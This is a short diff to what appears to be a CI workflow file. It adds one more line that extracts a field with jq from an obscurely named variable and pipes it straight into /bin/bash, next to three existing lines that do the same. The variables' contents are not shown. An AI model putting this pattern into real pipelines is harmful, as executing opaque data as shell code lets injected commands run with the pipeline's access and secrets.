@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$rx751" | jq -r .d546 | /bin/bash
           printf '%s' "$azhmj2089" | jq -r .m05528 | /bin/bash
           echo $t9154 | jq -r .mewxx08 | /bin/bash
+          echo $e3 | jq -r .oj6 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
